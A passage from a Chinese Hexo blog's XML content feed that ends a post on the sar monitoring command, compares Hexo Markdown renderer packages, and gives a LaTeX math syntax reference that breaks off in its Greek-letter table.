src="https://cdn.bugwz.com/sar-Y.png" alt="sar -y"></p><p><strong>数据指标解析：</strong></p><ul><li><code>TTY</code>：</li><li><code>rcvin/s</code>：每秒接收的中断数量；</li><li><code>xmtin/s</code>：每秒传送的中断数量；</li><li><code>framerr/s</code>：每秒发生的帧错误数（frame error）量；</li><li><code>prtyerr/s</code>：每秒发生的奇偶校验错误（parity error）数量；</li><li><code>brk/s</code>：每秒发生的暂停（break）数量；</li><li><code>ovrun/s</code>：每秒发生的溢出错误（overrun error）数量；</li></ul><h3 id="4-15、网络统计信息"><a href="#4-15、网络统计信息" class="headerlink" title="4.15、网络统计信息"></a>4.15、网络统计信息</h3><p>指令：<code>sar -n keyword</code>，其中<code>keyword</code>可选项如参数含义解析中所列。</p><p><img src="https://cdn.bugwz.com/sar-n-keyword.png" alt="sar -n keyword"></p><ul><li><code>IFACE</code>：</li><li><code>rxpck/s</code>：</li><li><code>txpck/s</code>：</li><li><code>rxKB/s</code>：</li><li><code>txKB/s</code>：</li><li><code>rxcmp/s</code>：</li><li><code>txcmp/s</code>：</li><li><code>rxmcst/s</code>：</li></ul><h3 id="4-16、性能问题排查技巧"><a href="#4-16、性能问题排查技巧" class="headerlink" title="4.16、性能问题排查技巧"></a>4.16、性能问题排查技巧</h3><ul><li>怀疑 CPU 存在瓶颈：可用<code>sar -u</code>和<code>sar -q</code>等来查看</li><li>怀疑内存存在瓶颈：可用<code>sar -B</code>、<code>sar -r</code>和<code>sar -W</code>等来查看</li><li>怀疑 I&#x2F;O 存在瓶颈：可用<code>sar -b</code>、<code>sar -u</code>和<code>sar -d</code>等来查看</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Commands </tag>
            
            <tag> sar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo的多种Markdown渲染器对比分析</title>
      <link href="/2019/09/17/hexo-markdown-renderer/"/>
      <url>/2019/09/17/hexo-markdown-renderer/</url>
      
        <content type="html"><![CDATA[<h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><p>Hexo作为一个优秀的Markdown博客框架，自然也诞生了很多适用的Markdown渲染器，这里对比分析一下Hexo下几种常用的Markdown渲染器：<code>hexo-renderer-marked</code>，<code>hexo-renderer-kramed</code>，<code>hexo-renderer-pandoc</code>，<code>hexo-renderer-markdown-it</code>，<code>hexo-renderer-markdown-it-plus</code>，本文使用的渲染器为：<code>hexo-renderer-markdown-it-plus</code>。</p><h2 id="二、详细介绍"><a href="#二、详细介绍" class="headerlink" title="二、详细介绍"></a>二、详细介绍</h2><h3 id="2-1、hexo-renderer-marked"><a href="#2-1、hexo-renderer-marked" class="headerlink" title="2.1、hexo-renderer-marked"></a>2.1、hexo-renderer-marked</h3><p>Hexo默认的Markdown的渲染器，针对于普通的Markdown的文章书写，该渲染器已经足够，但是由于不支持Mathjax，不支持插件扩展，不支持emoji表情，所以该渲染器也是介绍的渲染器中功能最弱的。</p><ul><li><p>GitHub地址：<a href="https://github.com/hexojs/hexo-renderer-marked">hexojs&#x2F;hexo-renderer-marked</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-marked">hexo-renderer-marked</a></p><ul><li><code>版本</code>：2.0.0</li><li><code>最近提交</code>：a month ago</li><li><code>依赖</code>：<a href="https://www.npmjs.com/package/hexo-util">hexo-util</a>，<a href="https://www.npmjs.com/package/marked">marked</a>，<a href="https://www.npmjs.com/package/strip-indent">strip-indent</a></li></ul></li><li><p>安装方式：<code>npm install hexo-renderer-marked —save</code></p></li></ul><h3 id="2-2、hexo-renderer-kramed"><a href="#2-2、hexo-renderer-kramed" class="headerlink" title="2.2、hexo-renderer-kramed"></a>2.2、hexo-renderer-kramed</h3><p>基于hexo-renderer-marked二次开发的渲染器，完善了对Mathjax的支持，仍然不支持插件的扩展，不支持emoji表情。</p><ul><li><p>GitHub地址：<a href="https://github.com/sun11/hexo-renderer-kramed">sun11&#x2F;hexo-renderer-kramed</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-kramed">hexo-renderer-kramed</a></p><ul><li><code>版本</code>：0.1.4</li><li><code>最近提交</code>：2 years ago</li><li><code>依赖</code>：<a href="https://www.npmjs.com/package/hexo-util">hexo-util</a>、<a href="https://www.npmjs.com/package/kramed">kramed</a>、<a href="https://www.npmjs.com/package/object-assign">object-assign</a>、<a href="https://www.npmjs.com/package/strip-indent">strip-indent</a></li></ul></li><li><p>安装方式：<code>npm install hexo-renderer-kramed --save</code></p></li></ul><h3 id="2-3、hexo-renderer-pandoc"><a href="#2-3、hexo-renderer-pandoc" class="headerlink" title="2.3、hexo-renderer-pandoc"></a>2.3、hexo-renderer-pandoc</h3><p>与hexo-renderer-marked类似，支持Mathjax语法，不仅可以渲染markdown，还支持textile，reStructedText和许多其他格式，仍然不支持emoji表情；内建的汇总文件<code>db.json</code>将来可能会非常大，同步到 Github 可能会比较慢，博客内建的搜索功能也可能会变得非常慢。</p><ul><li><p>GitHub地址：<a href="https://github.com/wzpan/hexo-renderer-pandoc">wzpan&#x2F;hexo-renderer-pandoc</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-pandoc">hexo-renderer-pandoc</a></p><ul><li><code>版本</code>：0.1.4</li><li><code>最近提交</code>：2 years ago</li><li><code>依赖</code>：无</li></ul></li><li><p>安装方式：<code>npm install hexo-renderer-pandoc --save</code></p></li></ul><h3 id="2-4、hexo-renderer-markdown-it"><a href="#2-4、hexo-renderer-markdown-it" class="headerlink" title="2.4、hexo-renderer-markdown-it"></a>2.4、hexo-renderer-markdown-it</h3><p>支持Mathjax语法（支持不太好），支持Markdown以及CommonMark语法，渲染速度比hexo-renderer-marked快，支持插件配置，支持标题带安全的id信息，支持脚注（上标，下标，下划线）。</p><ul><li><p>GitHub地址：<a href="https://github.com/hexojs/hexo-renderer-markdown-it">hexojs&#x2F;hexo-renderer-markdown-it</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-markdown-it">hexo-renderer-markdown-it</a></p><ul><li><code>版本</code>：3.4.1</li><li><code>最近提交</code>：4 years ago</li><li><code>依赖</code>：较多…</li></ul></li><li><p>安装方式：<code>npm i hexo-renderer-markdown-it —save</code></p></li></ul><h3 id="2-5、hexo-renderer-markdown-it-plus"><a href="#2-5、hexo-renderer-markdown-it-plus" class="headerlink" title="2.5、hexo-renderer-markdown-it-plus"></a>2.5、hexo-renderer-markdown-it-plus</h3><p>支持Katex插件并默认启用，默认启用插件列表：<code>markdown-it-emoji</code>，<code>markdown-it-sub</code>，<code>markdown-it-sup</code>，<code>markdown-it-deflist</code>，<code>markdown-it-abbr</code>，<code>markdown-it-footnote</code>，<code>markdown-it-ins</code>，<code>markdown-it-mark</code>，<code>@iktakahiro/markdown-it-katex</code>，<code>markdown-it-toc-and-anchor</code>。</p><ul><li><p>GitHub地址：<a href="https://github.com/CHENXCHEN/hexo-renderer-markdown-it-plus">CHENXCHEN&#x2F;hexo-renderer-markdown-it-plus</a></p></li><li><p>NPM地址：<a href="https://www.npmjs.com/package/hexo-renderer-markdown-it-plus">hexo-renderer-markdown-it-plus</a></p><ul><li><code>版本</code>：1.0.4</li><li><code>最近提交</code>：a year ago</li><li><code>依赖</code>：<a href="https://www.npmjs.com/package/%40iktakahiro%2Fmarkdown-it-katex">@iktakahiro&#x2F;markdown-it-katex</a>，<a href="https://www.npmjs.com/package/clone">clone</a>，<a href="https://www.npmjs.com/package/highlight.js">highlight.js</a>，<a href="https://www.npmjs.com/package/markdown-it">markdown-it</a>，<a href="https://www.npmjs.com/package/markdown-it-abbr">markdown-it-abbr</a>，<a href="https://www.npmjs.com/package/markdown-it-deflist">markdown-it-deflist</a>，<a href="https://www.npmjs.com/package/markdown-it-emoji">markdown-it-emoji</a>，<a href="https://www.npmjs.com/package/markdown-it-footnote">markdown-it-footnote</a>，<a href="https://www.npmjs.com/package/markdown-it-ins">markdown-it-ins</a>，<a href="https://www.npmjs.com/package/markdown-it-mark">markdown-it-mark</a>，<a href="https://www.npmjs.com/package/markdown-it-sub">markdown-it-sub</a>，<a href="https://www.npmjs.com/package/markdown-it-sup">markdown-it-sup</a>，<a href="https://www.npmjs.com/package/markdown-it-toc">markdown-it-toc</a>，<a href="https://www.npmjs.com/package/uslug">uslug</a></li></ul></li><li><p>安装方式：<code>npm i hexo-renderer-markdown-it-plus —save</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown中支持LaTex数学公式</title>
      <link href="/2019/09/14/markdown-latex/"/>
      <url>/2019/09/14/markdown-latex/</url>
      
        <content type="html"><![CDATA[<h1 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h1><p>Markdown在目前无疑是一个比较好的写作方式，但是它时候和大部分的写作软件一样，在一些数据公式的编写上，只能引入图片呢？除了引用图片之外是不是还有更好的数学公式编辑手段呢？这里主要介绍一下LaTex Math在Markdown上的支持。</p><p>本博客目前采用<a href="https://github.com/sun11/hexo-renderer-kramed">hexo-renderer-kramed</a>渲染器替换了Hexo自带的hexo-renderer-marked渲染器来支持LaTex；</p><h3 id="LaTex介绍"><a href="#LaTex介绍" class="headerlink" title="LaTex介绍"></a>LaTex介绍</h3><p><a href="https://www.latex-project.org/">LaTex</a>是一种基于TeX的排版系统，LaTeX使用TeX作为它的格式化引擎，LaTeX遵循呈现与内容分离的设计理念，以便作者可以专注于他们正在编写的内容，而不必同时注视其外观。在准备LaTeX文档时，作者使用章（chapter）、节（section）、表（table）、图（figure）等简单的概念指定文档的逻辑结构，并让LaTeX系统负责这些结构的格式和布局。因此，它鼓励从内容中分离布局，同时仍然允许在需要时进行手动排版调整。这个概念类似于许多文字处理器允许全局定义整个文档的样式的机制，或使用层叠样式表来规定HTML的样式。LaTeX系统是一种可以处理排版和渲染的标记语言。</p><h1 id="二、Markdown的Latex规则"><a href="#二、Markdown的Latex规则" class="headerlink" title="二、Markdown的Latex规则"></a>二、Markdown的Latex规则</h1><h2 id="2-1、行内与独行"><a href="#2-1、行内与独行" class="headerlink" title="2.1、行内与独行"></a>2.1、行内与独行</h2><ul><li><p><code>行内公式</code>：将公式插入到本行内，格式为<code>$公式内容$</code>，如：<code>$xyz$</code>，展示效果为：$xyz$；</p></li><li><p><code>独行公式</code>：将公式居中插入到新的一行内，格式为<code>$$公式内容$$</code>，如：<code>$$xyz$$</code>，展示效果为：</p><p>$$xyz$$</p></li></ul><h2 id="2-2、上标、下标与组合"><a href="#2-2、上标、下标与组合" class="headerlink" title="2.2、上标、下标与组合"></a>2.2、上标、下标与组合</h2><ul><li><code>上标符号</code>：格式为<code>^</code>，如：<code>$x^4$</code>，展示效果为：$x^4$；</li><li><code>下标符号</code>：格式为<code>_</code>，如：<code>$x_1$</code>，展示效果为：$x_1$；</li><li><code>组合符号</code>：格式为<code>&#123;&#125;</code>，如：<code>$&#123;16&#125;_&#123;8&#125;O&#123;2+&#125;_&#123;2&#125;$</code>，展示效果为：${16}<em>{8}O{2+}</em>{2}$；</li></ul><h2 id="2-3、汉字、字体与格式"><a href="#2-3、汉字、字体与格式" class="headerlink" title="2.3、汉字、字体与格式"></a>2.3、汉字、字体与格式</h2><ul><li><code>汉字形式</code>：格式为<code>\mbox&#123;&#125;</code>，如：<code>$V_&#123;\mbox&#123;初始&#125;&#125;$</code>，展示效果为：$V_{\mbox{初始}}$；</li><li><code>字体控制</code>：格式为<code>\displaystyle</code>，如：<code>$\displaystyle \frac&#123;x+y&#125;&#123;y+z&#125;$</code>，展示效果为：$\displaystyle \frac{x+y}{y+z}$；</li><li><code>下划线符号</code>：格式为<code>\underline</code>，如：<code>$\underline&#123;x+y&#125;$</code>，展示效果为：$\underline{x+y}$；</li><li><code>标签</code>：格式为<code>\tag&#123;数字&#125;</code>，如：<code>$\tag&#123;11&#125;$</code>，展示效果为：$\tag{11}$；</li><li><code>上大括号</code>：格式为<code>\overbrace&#123;算式&#125;</code>，如：<code>$\overbrace&#123;a+b+c+d&#125;^&#123;2.0&#125;$</code>，展示效果为：$\overbrace{a+b+c+d}^{2.0}$；</li><li><code>下大括号</code>：格式为<code>\underbrace&#123;算式&#125;</code>，如：<code>$a+\underbrace&#123;b+c&#125;_&#123;1.0&#125;+d$</code>，展示效果为：$a+\underbrace{b+c}_{1.0}+d$；</li><li><code>上位符号</code>：格式为<code>\stacrel&#123;上位符号&#125;&#123;基位符号&#125;</code>，如：<code>$\vec&#123;x&#125;\stackrel&#123;\mathrm&#123;def&#125;&#125;&#123;=&#125;&#123;x_1,\dots,x_n&#125;$</code>，展示效果为：$\vec{x}\stackrel{\mathrm{def}}{&#x3D;}{x_1,\dots,x_n}$；</li></ul><h2 id="2-4、占位符"><a href="#2-4、占位符" class="headerlink" title="2.4、占位符"></a>2.4、占位符</h2><ul><li><code>两个quad空格</code>：格式为<code>\qquad</code>，如：<code>$x \qquad y$</code>，展示效果为：$x \qquad y$；</li><li><code>quad空格</code>：格式为<code>\quad</code>，如：<code>$x \quad y$</code>，展示效果为：$x \quad y$；</li><li><code>大空格</code>：格式为<code>\</code>，如：<code>$x \ y$</code>，展示效果为：$x \ y$；</li><li><code>中空格</code>：格式为<code>\:</code>，如：<code>$x : y$</code>，展示效果为：$x : y$；</li><li><code>小空格</code>：格式为<code>\,</code>，如：<code>$x , y$</code>，展示效果为：$x , y$；</li><li><code>没有空格``：格式为</code> <code>，如：</code>$xy$&#96;，展示效果为：$xy$；</li><li><code>紧贴</code>：格式为<code>\!</code>，如：<code>$x ! y$</code>，展示效果为：$x ! y$；</li></ul><h2 id="2-5、定界符与组合"><a href="#2-5、定界符与组合" class="headerlink" title="2.5、定界符与组合"></a>2.5、定界符与组合</h2><ul><li><code>括号</code>：格式为<code>（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)</code>，如：<code>$()\big(\big) \Big(\Big)\bigg(\bigg)\Bigg(\Bigg)$</code>，展示效果为：$（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)$；</li><li><code>中括号</code>：格式为<code>[]</code>，如：<code>$[x+y]$</code>，展示效果为：$[x+y]$；</li><li><code>大括号</code>：格式为<code>\&#123; \&#125;</code>，如：<code>$&#123;x+y&#125;$</code>，展示效果为：${x+y}$；</li><li><code>自适应括号</code>：格式为<code>\left \right</code>，如：<code>$\left(x\right)$</code>，<code>$\left(x&#123;yz&#125;\right)$</code>，展示效果为：$\left(x\right)$，$\left(x{yz}\right)$；</li><li><code>组合公式</code>：格式为<code>&#123;上位公式 \choose 下位公式&#125;</code>，如：<code>$&#123;n+1 \choose k&#125;=&#123;n \choose k&#125;+&#123;n \choose k-1&#125;$</code>,展示效果为：${n+1 \choose k}&#x3D;{n \choose k}+{n \choose k-1}$；</li><li><code>组合公式</code>：格式为<code>&#123;上位公式 \atop 下位公式&#125;</code>，如：<code>$\sum_&#123;k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n&#125;A_&#123;k_0&#125;A_&#123;k_1&#125;\cdots$</code>，展示效果为：$\sum_{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots&#x3D;n}A_{k_0}A_{k_1}\cdots$；</li></ul><h2 id="2-6、四则运算"><a href="#2-6、四则运算" class="headerlink" title="2.6、四则运算"></a>2.6、四则运算</h2><ul><li><code>加法运算</code>：格式为符号：<code>+</code>，如：<code>$x+y=z$</code>，展示效果为：$x+y&#x3D;z$；</li><li><code>减法运算</code>：格式为<code>-</code>，如：<code>$x-y=z$</code>，展示效果为：$x-y&#x3D;z$；</li><li><code>加减运算</code>：格式为<code>\pm</code>，如：<code>$x \pm y=z$</code>，展示效果为：$x \pm y&#x3D;z$；</li><li><code>减甲运算</code>：格式为<code>\mp</code>，如：<code>$x \mp y=z$</code>，展示效果为：$x \mp y&#x3D;z$；</li><li><code>乘法运算</code>：格式为<code>\times</code>，如：<code>$x \times y=z$</code>，展示效果为：$x \times y&#x3D;z$；</li><li><code>点乘运算</code>：格式为<code>\cdot</code>，如：<code>$x \cdot y=z$</code>，展示效果为：$x \cdot y&#x3D;z$；</li><li><code>星乘运算</code>：格式为<code>\ast</code>，如：<code>$x \ast y=z$</code>，展示效果为：$x \ast y&#x3D;z$；</li><li><code>除法运算</code>：格式为<code>\div</code>，如：<code>$x \div y=z$</code>，展示效果为：$x \div y&#x3D;z$；</li><li><code>斜法运算</code>：格式为<code>/</code>，如：<code>$x/y=z$</code>，展示效果为：$x&#x2F;y&#x3D;z$；</li><li><code>分式表示</code>：格式为<code>\frac&#123;分子&#125;&#123;分母&#125;</code>，如：<code>$\frac&#123;x+y&#125;&#123;y+z&#125;$</code>，展示效果为：$\frac{x+y}{y+z}$；</li><li><code>分式表示</code>：格式为<code>&#123;分子&#125; \voer &#123;分母&#125;</code>，如：<code>$&#123;x+y&#125; \over &#123;y+z&#125;$</code>，展示效果为：${x+y} \over {y+z}$；</li><li><code>绝对值表示</code>：格式为<code>||</code>，如：<code>$|x+y|$</code>，展示效果为：$|x+y|$；</li></ul><h2 id="2-7、高级运算"><a href="#2-7、高级运算" class="headerlink" title="2.7、高级运算"></a>2.7、高级运算</h2><ul><li>平均数运算：格式为<code>\overline&#123;算式&#125;</code>，如：<code>$\overline&#123;xyz&#125;$</code>，展示效果为：$\overline{xyz}$；</li><li>开二次方运算：格式为<code>\sqrt</code>，如：$\sqrt x$，展示效果为：；</li><li>开方运算：格式为<code>\sqrt[开方数]&#123;被开方数&#125;</code>，如：<code>$\sqrt[3]&#123;x+y&#125;$</code>，展示效果为：$\sqrt[3]{x+y}$；</li><li>对数运算：格式为<code>\log</code>，如：<code>$\log(x)$</code>，展示效果为：$\log(x)$；</li><li>极限运算：格式为<code>\lim</code>，如：<code>$\lim^&#123;x \to \infty&#125;_&#123;y \to 0&#125;&#123;\frac&#123;x&#125;&#123;y&#125;&#125;$</code>，展示效果为：$\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$；</li><li>极限运算：格式为<code>\displaystyle \lim</code>，如：<code>$\displaystyle \lim^&#123;x \to \infty&#125;_&#123;y \to 0&#125;&#123;\frac&#123;x&#125;&#123;y&#125;&#125;$</code>，展示效果为：$\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$；</li><li>求和运算：格式为<code>\sum</code>，如：<code>$\sum^&#123;x \to \infty&#125;_&#123;y \to 0&#125;&#123;\frac&#123;x&#125;&#123;y&#125;&#125;$</code>，展示效果为：$\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$；</li><li>求和运算：格式为<code>\displaystyle \sum</code>，如：<code>$\displaystyle \sum^&#123;x \to \infty&#125;_&#123;y \to 0&#125;&#123;\frac&#123;x&#125;&#123;y&#125;&#125;$</code>，展示效果为：$\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$；</li><li>积分运算：格式为<code>\int</code>，如：<code>$\int^&#123;\infty&#125;_&#123;0&#125;&#123;xdx&#125;$</code>，展示效果为：$\int^{\infty}_{0}{xdx}$；</li><li>积分运算：格式为<code>\displaystyle \int</code>，如：<code>$\displaystyle \int^&#123;\infty&#125;_&#123;0&#125;&#123;xdx&#125;$</code>，展示效果为：$\displaystyle \int^{\infty}_{0}{xdx}$；</li><li>微分运算：格式为<code>\partial</code>，如：<code>$\frac&#123;\partial x&#125;&#123;\partial y&#125;$</code>，展示效果为：$\frac{\partial x}{\partial y}$；</li><li>矩阵表示：格式为<code>\begin&#123;matrix&#125; \end&#123;matrix&#125;</code>，如：<code>$\left[ \begin&#123;matrix&#125; 1 &amp;2 &amp;\cdots &amp;4\5 &amp;6 &amp;\cdots &amp;8\\vdots &amp;\vdots &amp;\ddots &amp;\vdots\13 &amp;14 &amp;\cdots &amp;16\end&#123;matrix&#125; \right]$</code>，展示效果为：$\left[ \begin{matrix} 1 &amp;2 &amp;\cdots &amp;4\5 &amp;6 &amp;\cdots &amp;8\vdots &amp;\vdots &amp;\ddots &amp;\vdots\13 &amp;14 &amp;\cdots &amp;16\end{matrix} \right]$；</li></ul><h2 id="2-8、逻辑运算"><a href="#2-8、逻辑运算" class="headerlink" title="2.8、逻辑运算"></a>2.8、逻辑运算</h2><ul><li>等于运算：格式为<code>=</code>，如：<code>$x+y=z$</code>，展示效果为：$x+y&#x3D;z$；</li><li>大于运算：格式为<code>&gt;</code>，如：<code>$x+y&gt;z$</code>，展示效果为：$x+y&gt;z$；</li><li>小于运算：格式为<code>&lt;</code>，如：<code>$x+y&lt;z$</code>，展示效果为：$x+y&lt;z$；</li><li>大于等于运算：格式为<code>\geq</code>，如：<code>$x+y \geq z$</code>，展示效果为：$x+y \geq z$；</li><li>小于等于运算：格式为<code>\leq</code>，如：<code>$x+y \leq z$</code>，展示效果为：$x+y \leq z$；</li><li>不等于运算：格式为<code>\neq</code>，如：<code>$x+y \neq z$</code>，展示效果为：$x+y \neq z$；</li><li>不大于等于运算：格式为<code>\ngeq</code>，如：<code>$x+y \ngeq z$</code>，展示效果为：$x+y \ngeq z$；</li><li>不大于等于运算：格式为<code>\not\geq</code>，如：<code>$x+y \not\geq z$</code>，展示效果为：$x+y \not\geq z$；</li><li>不小于等于运算：格式为<code>\nleq</code>，如：<code>$x+y \nleq z$</code>，展示效果为：$x+y \nleq z$；</li><li>不小于等于运算：格式为<code>\not\leq</code>，如：<code>$x+y \not\leq z$</code>，展示效果为：$x+y \not\leq z$；</li><li>约等于运算：格式为<code>\approx</code>，如：<code>$x+y \approx z$</code>，展示效果为：$x+y \approx z$；</li><li>恒定等于运算：格式为<code>\equiv</code>，如：<code>$x+y \equiv z$</code>，展示效果为：$x+y \equiv z$；</li></ul><h2 id="2-9、集合运算"><a href="#2-9、集合运算" class="headerlink" title="2.9、集合运算"></a>2.9、集合运算</h2><ul><li>属于运算：格式为<code>\in</code>，如：<code>$x \in y$</code>，展示效果为：$x \in y$；</li><li>不属于运算：格式为<code>\notin</code>，如：<code>$x \notin y$</code>，展示效果为：$x \notin y$；</li><li>不属于运算：格式为<code>\not\in</code>，如：<code>$x \not\in y$</code>，展示效果为：$x \not\in y$；</li><li>子集运算：格式为<code>\subset</code>，如：<code>$x \subset y$</code>，展示效果为：$x \subset y$；</li><li>子集运算：格式为<code>\supset</code>，如：<code>$x \supset y$</code>，展示效果为：$x \supset y$；</li><li>真子集运算：格式为<code>\subseteq</code>，如：<code>$x \subseteq y$</code>，展示效果为：$x \subseteq y$；</li><li>非真子集运算：格式为<code>\subsetneq</code>，如：<code>$x \subsetneq y$</code>，展示效果为：$x \subsetneq y$；</li><li>真子集运算：格式为<code>\supseteq</code>，如：<code>$x \supseteq y$</code>，展示效果为：$x \supseteq y$；</li><li>非真子集运算：格式为<code>\supsetneq</code>，如：<code>$x \supsetneq y$</code>，展示效果为：$x \supsetneq y$；</li><li>非子集运算：格式为<code>\not\subset</code>，如：<code>$x \not\subset y$</code>，展示效果为：$x \not\subset y$；</li><li>非子集运算：格式为<code>\not\supset</code>，如：<code>$x \not\supset y$</code>，展示效果为：$x \not\supset y$；</li><li>并集运算：格式为<code>\cup</code>，如：<code>$x \cup y$</code>，展示效果为：$x \cup y$；</li><li>交集运算：格式为<code>\cap</code>，如：<code>$x \cap y$</code>，展示效果为：$x \cap y$；</li><li>差集运算：格式为<code>\setminus</code>，如：<code>$x \setminus y$</code>，展示效果为：$x \setminus y$；</li><li>同或运算：格式为<code>\bigodot</code>，如：<code>$x \bigodot y$</code>，展示效果为：$x \bigodot y$；</li><li>同与运算：格式为<code>\bigotimes</code>，如：<code>$x \bigotimes y$</code>，展示效果为：$x \bigotimes y$；</li><li>实数集合：格式为<code>\mathbb&#123;R&#125;</code>，如：<code>mathbb&#123;R&#125;</code>，展示效果为：<code>\mathbb&#123;R&#125;</code>；</li><li>自然数集合：格式为<code>\mathbb&#123;Z&#125;</code>，如：<code>\mathbb&#123;Z&#125;</code>，展示效果为：<code>\mathbb&#123;Z&#125;</code>；</li><li>空集：格式为<code>\emptyset</code>，如：<code>$\emptyset$</code>，展示效果为：$\emptyset$；</li></ul><h2 id="2-10、数学符号"><a href="#2-10、数学符号" class="headerlink" title="2.10、数学符号"></a>2.10、数学符号</h2><ul><li>无穷：格式为<code>\infty</code>，如：<code>$\infty$</code>，展示效果为：$\infty$；</li><li>虚数：格式为<code>\imath</code>，如：<code>$\imath$</code>，展示效果为：$\imath$；</li><li>虚数：格式为<code>\jmath</code>，如：<code>$\jmath$</code>，展示效果为：$\jmath$；</li><li>数学符号：格式为<code>\hat&#123;a&#125;</code>，如：<code>$\hat&#123;a&#125;$</code>，展示效果为：$\hat{a}$；</li><li>数学符号：格式为<code>\check&#123;a&#125;</code>，如：<code>$\check&#123;a&#125;$</code>，展示效果为：$\check{a}$；</li><li>数学符号：格式为<code>\breve&#123;a&#125;</code>，如：<code>$\breve&#123;a&#125;$</code>，展示效果为：$\breve{a}$；</li><li>数学符号：格式为<code>\tilde&#123;a&#125;</code>，如：<code>$\tilde&#123;a&#125;$</code>，展示效果为：$\tilde{a}$；</li><li>数学符号：格式为<code>\bar&#123;a&#125;</code>，如：<code>$\bar&#123;a&#125;$</code>，展示效果为：$\bar{a}$；</li><li>矢量符号：格式为<code>\vec&#123;a&#125;</code>，如：<code>$\vec&#123;a&#125;$</code>，展示效果为：$\vec{a}$；</li><li>数学符号：格式为<code>\acute&#123;a&#125;</code>，如：<code>$\acute&#123;a&#125;$</code>，展示效果为：$\acute{a}$；</li><li>数学符号：格式为<code>\grave&#123;a&#125;</code>，如：<code>$\grave&#123;a&#125;$</code>，展示效果为：$\grave{a}$；</li><li>数学符号：格式为<code>\mathring&#123;a&#125;</code>，如：<code>$\mathring&#123;a&#125;$</code>，展示效果为：$\mathring{a}$；</li><li>一阶导数符号：格式为<code>\dot&#123;a&#125;</code>，如：<code>$\dot&#123;a&#125;$</code>，展示效果为：$\dot{a}$；</li><li>二阶导数符号：格式为<code>\ddot&#123;a&#125;</code>，如：<code>$\ddot&#123;a&#125;$</code>，展示效果为：$\ddot{a}$；</li><li>上箭头：格式为<code>\uparrow</code>，如：<code>$\uparrow$</code>，展示效果为：$\uparrow$；</li><li>上箭头：格式为<code>\Uparrow</code>，如：<code>$\Uparrow$</code>，展示效果为：$\Uparrow$；</li><li>下箭头：格式为<code>\downarrow</code>，如：<code>$\downarrow$</code>，展示效果为：$\downarrow$；</li><li>下箭头：格式为<code>\Downarrow</code>，如：<code>$\Downarrow$</code>，展示效果为：$\Downarrow$；</li><li>左箭头：格式为<code>\leftarrow</code>，如：<code>$\leftarrow$</code>，展示效果为：$\leftarrow$；</li><li>左箭头：格式为<code>\Leftarrow</code>，如：<code>$\Leftarrow$</code>，展示效果为：$\Leftarrow$；</li><li>右箭头：格式为<code>\rightarrow</code>，如：<code>$\rightarrow$</code>，展示效果为：$\rightarrow$；</li><li>右箭头：格式为<code>\Rightarrow</code>，如：<code>$\Rightarrow$</code>，展示效果为：$\Rightarrow$；</li><li>底端对齐的省略号：格式为<code>\ldots</code>，如：<code>$1,2,\ldots,n$</code>，展示效果为：$1,2,\ldots,n$；</li><li>中线对齐的省略号：格式为<code>\cdots</code>，如：<code>$x_1^2 + x_2^2 + \cdots + x_n^2$</code>，展示效果为：$x_1^2 + x_2^2 + \cdots + x_n^2$；</li><li>竖直对齐的省略号：格式为<code>\vdots</code>，如：<code>$\vdots$</code>，展示效果为：$\vdots$；</li><li>斜对齐的省略号：格式为<code>\ddots</code>，如：<code>$\ddots$</code>，展示效果为：$\ddots$；</li></ul><h2 id="2-11、希腊字母"><a href="#2-11、希腊字母" class="headerlink" title="2.11、希腊字母"></a>2.11、希腊字母</h2><table><thead><tr><th align="center">字母</th><th align="center">格式实现</th><th align="center">字母</th><th align="center">格式实现</th></tr></thead><tbody><tr><td align="center">A</td><td align="center"><code>A</code></td><td align="center">α</td><td align="center"><code>\alhpa</code></td></tr><tr><td align="center">B</td><td align="center"><code>B</code></td><td align="center">β</td><td align="center"><code>\beta</code></td></tr><tr><td align="center">Γ</td><td align="center"><code>\Gamma</code></td><td align="center">γ</td><td align="center"><code>\gamma</code></td></tr><tr><td align="center">Δ</td><td align="center"><code>\Delta</code></td><td align="center">δ</td><td align="center"><code>\delta</code></td></tr><tr><td align="center">E</td><td align="center"><code>E</code></td><td align="center">ϵ</td><td align="center"><code>\epsilon</code></td></tr><tr><td align="center">Z</td><td align="center"><code>Z</code></td><td align="center">ζ</td><td align="center"><code>\zeta</code></td></tr><tr><td align="center">H</td><td align="center"><code>H</code></td><td align="center">η</td><td align="center"><code>\eta</code></td></tr><tr><td align="center">Θ</td><td align="center"><code>\Theta</code></td><td align="center">θ</td><td align="center"><code>\theta</code></td></tr><tr><td align="center">I</td><td align="center"><code>I</code></td><td align="center">ι</td><td align="center"><code>\iota</code></td></tr><tr><td align="center">K</td><td align="center"><code>K</code></td><td align="center">κ</td><td align="center"><code>\kappa</code></td></tr><tr><td align="center">Λ</td><td align="center"><code>\Lambda</code></td><td align="center">λ</td><td align="center"><code>\lambda</code></td></tr><tr><td align="center">M</td><td align="center"><code>M</code></td><td align="center">μ</td><td align="center"><code>\mu</code></td></tr><tr><td align="center">N</td><td align="center"><code>N</code></td><td align="center">ν</td><td align="center"><code>\nu</code></td></tr><tr><td align="center">Ξ</td><td align="center"><code>\Xi</code></td><td align="center">ξ</td><td align="center"><code>\xi</code></td></tr><tr><td align="center">O</td><td align="center"><code>O</code></td><td align="center">ο</td><td align="center"><code>\omicron</code></td></tr><tr><td align="center">Π</td><td align="center"><code>\Pi</code></td><td align="center">π</td><td align="center"><code>\pi</code></td></tr><tr><td align="center">P</td><td 